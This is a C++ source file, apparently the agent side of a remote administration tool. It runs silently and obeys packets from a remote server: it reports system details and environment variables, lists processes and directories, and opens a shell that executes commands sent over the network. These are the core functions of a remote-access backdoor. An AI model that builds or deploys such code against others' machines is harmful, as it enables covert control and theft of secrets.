#include "Application.h"
#include <boost/make_shared.hpp>
#include "services/NetClientService.h"
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include "../../shared/NetLib/packets/PacketFileSystem.h"
#include <boost/filesystem/operations.hpp>
#include <boost/algorithm/string/trim.hpp>
#include "services/FileSystemService.h"
#include "../../shared/NetLib/packets/PacketShell.h"
#include "ShellService.h"
#include "services/SystemService.h"
#include "../../shared/NetLib/packets/PacketProcess.h"
#include "ProcessService.h"

Application::Application()
{
}

Application::~Application()
{
}

void Application::run()
{
	running = true;
	netClientService = NetClientService::createInstance(shared_from_this());
	netClientService->runAsync();
	shellService = boost::make_shared<ShellService>(shared_from_this());

	while (running)
	{
		boost::this_thread::sleep(boost::chrono::seconds(100));
	}
}


void Application::onPacketReceived(const boost::shared_ptr<Packet>& packet)
{
	switch (packet->packetType)
	{
	case PacketType::ClientInformation:
		{
			std::string pcName, osName;
			std::wstring userName;

			SystemService::getBasicSystemInfo(pcName, userName, osName);
			const std::map<std::string, std::string> environment = SystemService::getEnvironmentVariables();

			netClientService->sendClientInformation(pcName, userName, osName, environment);
			break;
		}
	case PacketType::Process:
		{
			const boost::shared_ptr<PacketProcess> packetProcess = boost::dynamic_pointer_cast<PacketProcess>(packet);
			std::list<Process> processes;
			ProcessService::getProcesses(processes);
			netClientService->sendProcessList(processes);
			break;
		}
	case PacketType::FileSystem:
		{
			const boost::shared_ptr<PacketFileSystem> packetFs = boost::dynamic_pointer_cast<PacketFileSystem>(packet);
			std::wstring path = packetFs->path;
			boost::trim(path);

			if (path.empty() || path == L"/")
				sendFsRoots();
			else
				sendListDir(path);
			break;
		}
	case PacketType::Shell:
		{
			const boost::shared_ptr<PacketShell> packetShell = boost::dynamic_pointer_cast<PacketShell>(packet);
			if (packetShell->action == PacketShell::PacketAction::Start)
			{
				if (!shellService->isShellActive())
				{
					shellService->spawnShell();
				}
			}
			else if (packetShell->action == PacketShell::PacketAction::Exec)
			{
				if (shellService->isShellActive())
				{
					shellService->writeToShell(packetShell->data);
				}
			}
			break;
		}
	default:
		std::cout << "Unhandled packet type" << std::endl;
	}
}

void Application::onShellData(const std::string& data)
{
	netClientService->sendShellData(data);
}

void Application::onShellStopped()
{
	netClientService->sendStopShell();
}


void Application::sendListDir(const std::wstring& path)
{
	std::vector<FileInfo> dirEntries;
	boost::system::error_code err;
	FileSystemService::retrieveListDir(path, dirEntries, err);
	if (!err)
		netClientService->sendDirEntries(path, dirEntries);
	else
	{
		// TODO: Exception handling
	}
}


void Application::sendFsRoots()
{
	std::vector<FileInfo> rootEntries;
	boost::system::error_code err;
	FileSystemService::retrieveRoots(rootEntries, err);
	
	if (!err)
		netClientService->sendDirEntries(L"", rootEntries);
	else
	{
		// TODO: Exception handling
	}
}

/*static*/
boost::shared_ptr<Application> Application::getInstance()
{
	if (appInstance == nullptr)
		appInstance = boost::make_shared<Application>();

	return appInstance;
}
